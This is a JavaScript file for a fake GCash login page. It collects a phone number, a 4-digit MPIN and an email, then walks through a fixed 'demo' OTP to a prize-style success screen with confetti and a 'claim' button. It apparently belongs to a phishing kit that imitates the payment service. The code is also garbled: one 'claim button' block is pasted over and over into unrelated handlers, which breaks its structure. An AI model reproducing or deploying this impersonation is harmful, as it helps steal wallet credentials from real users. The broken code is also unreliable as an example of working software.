// GCash Login Script

document.addEventListener('DOMContentLoaded', function() {
    // Get all form elements
    const phoneForm = document.getElementById('phone-form');
    const pinForm = document.getElementById('pin-form');
    const otpForm = document.getElementById('otp-form');
    
    // Get all screen elements
    const phoneScreen = document.getElementById('phone-screen');
    const pinScreen = document.getElementById('pin-screen');
    const otpScreen = document.getElementById('otp-screen');
    const successScreen = document.getElementById('success-screen');
    
    // Get error message elements
    const phoneError = document.getElementById('phone-error');
    const pinError = document.getElementById('pin-error');
    const otpError = document.getElementById('otp-error');
    
    // Get display phone elements
    const displayPhone = document.getElementById('display-phone');
    const displayPhoneOtp = document.getElementById('display-phone-otp');
    
    // Get PIN input elements
    const pinInputs = document.querySelectorAll('.pin-input');
    const pinSubmit = document.getElementById('pin-submit');
    
    // Get OTP input elements
    const otpInputs = document.querySelectorAll('.otp-input');
    const otpSubmit = document.getElementById('otp-submit');
    
    // Get other elements
    const changeNumber = document.getElementById('change-number');
    const resendCode = document.getElementById('resend-code');
    const countdown = document.getElementById('countdown');
    const timer = document.getElementById('timer');
    const continueBtn = document.getElementById('continue-btn');
    
    // Phone number validation
    phoneForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phoneNumber = document.getElementById('phone-number').value.trim();
        
        // Validate phone number (must be 10 digits starting with 9)
        if (!/^9\d{9}$/.test(phoneNumber)) {
            phoneError.textContent = 'Please enter a valid mobile number';
            return;
        }
        
        // Format phone number for display
        const formattedPhone = formatPhoneNumber(phoneNumber);
        displayPhone.textContent = formattedPhone;
        
        // Get email address
        const emailAddress = document.getElementById('email-address').value.trim();
        
        // Display email address on OTP screen
        displayPhoneOtp.textContent = emailAddress;
        
        // Clear error message
        phoneError.textContent = '';
        
        // Show PIN screen
        phoneScreen.style.display = 'none';
        pinScreen.style.display = 'block';
        
        // Focus on first PIN input
        pinInputs[0].focus();
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // PIN input handling
    pinInputs.forEach(function(input, index) {
        // Handle input
        input.addEventListener('input', function(e) {
            // Allow only numbers
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // Move to next input if value is entered
            if (this.value && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
            
            // Check if all inputs have values
            checkPinInputs();
            
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
        
        // Handle keydown
        input.addEventListener('keydown', function(e) {
            // Move to previous input on backspace if current input is empty
            if (e.key === 'Backspace' && !this.value && index > 0) {
                pinInputs[index - 1].focus();
            }
            
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // PIN form submission
    pinForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get PIN
        const pin = Array.from(pinInputs).map(input => input.value).join('');
        
        // Validate PIN (must be 4 digits)
        if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
            pinError.textContent = 'Please enter a valid 4-digit MPIN';
            return;
        }
        
        // Clear error message
        pinError.textContent = '';
        
        // Get email address from the first screen
        const emailAddress = document.getElementById('email-address').value.trim();
        
        // Validate email address
        if (!emailAddress || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailAddress)) {
            pinError.textContent = 'Please enter a valid email address';
            return;
        }
        
        // Generate OTP (fixed for demo purposes)
        const otp = '092422';
        
        // Send OTP email via the server
        fetch('/send_otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: emailAddress,
                otp: otp
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('OTP email sent:', data);
            // Show OTP screen regardless of email success (for demo purposes)
            pinScreen.style.display = 'none';
            otpScreen.style.display = 'block';
            
            // Focus on first OTP input
            otpInputs[0].focus();
            
            // Start countdown
            startCountdown();
        })
        .catch(error => {
            console.error('Error sending OTP email:', error);
            // Show OTP screen anyway (for demo purposes)
            pinScreen.style.display = 'none';
            otpScreen.style.display = 'block';
            
            // Focus on first OTP input
            otpInputs[0].focus();
            
            // Start countdown
            startCountdown();
            
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // Change number link
    changeNumber.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Show phone screen
        pinScreen.style.display = 'none';
        phoneScreen.style.display = 'block';
        
        // Clear PIN inputs
        pinInputs.forEach(input => input.value = '');
        
        // Disable PIN submit button
        pinSubmit.disabled = true;
        
        // Clear error message
        pinError.textContent = '';
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // OTP input handling
    otpInputs.forEach(function(input, index) {
        // Handle input
        input.addEventListener('input', function(e) {
            // Allow only numbers
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // Move to next input if value is entered
            if (this.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            
            // Check if all inputs have values
            checkOtpInputs();
            
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
        
        // Handle keydown
        input.addEventListener('keydown', function(e) {
            // Move to previous input on backspace if current input is empty
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpInputs[index - 1].focus();
            }
            
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // OTP form submission
    otpForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get OTP
        const otp = Array.from(otpInputs).map(input => input.value).join('');
        
        // Validate OTP (must be 6 digits)
        if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
            otpError.textContent = 'Please enter a valid 6-digit code';
            return;
        }
        
        // For demo purposes, check against fixed OTP code
        const validOtp = '092422';
        if (otp !== validOtp) {
            otpError.textContent = 'Invalid verification code. Please try again.';
            return;
        }
        
        // Clear error message
        otpError.textContent = '';
        
        // Show success screen
        otpScreen.style.display = 'none';
        successScreen.style.display = 'block';
        
        // Start confetti animation
        if (typeof confetti !== 'undefined' && confetti.start) {
            confetti.start();
            setTimeout(() => {
                confetti.stop();
            }, 5000);
        }
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // Resend code link
    resendCode.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Hide resend link
        resendCode.style.display = 'none';
        
        // Show timer
        timer.style.display = 'inline';
        
        // Start countdown
        startCountdown();
        
        // Clear OTP inputs
        otpInputs.forEach(input => input.value = '');
        
        // Disable OTP submit button
        otpSubmit.disabled = true;
        
        // Clear error message
        otpError.textContent = '';
        
        // Focus on first OTP input
        otpInputs[0].focus();
        
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});
    
    // Success screen animation effects
    function showSuccessEffects() {
        // Add any additional success screen effects here
        console.log('Success screen shown with animations');
    }
    
    // Helper functions
    function checkPinInputs() {
        const allFilled = Array.from(pinInputs).every(input => input.value.length === 1);
        pinSubmit.disabled = !allFilled;
    }
    
    function checkOtpInputs() {
        const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
        otpSubmit.disabled = !allFilled;
    }
    
    function formatPhoneNumber(number) {
        return '+63 ' + number.replace(/^(\d{3})(\d{3})(\d{4})$/, '$1 $2 $3');
    }
    
    function startCountdown() {
        let seconds = 30;
        countdown.textContent = seconds;
        
        const interval = setInterval(function() {
            seconds--;
            countdown.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(interval);
                timer.style.display = 'none';
                resendCode.style.display = 'inline';
            }
        }, 1000);
    }
    
    // Add event listener for claim button
    const claimButton = document.querySelector('.claim-button');
    if (claimButton) {
        claimButton.addEventListener('click', function() {
            console.log('Claim button clicked');
            window.close();
        });
    }
});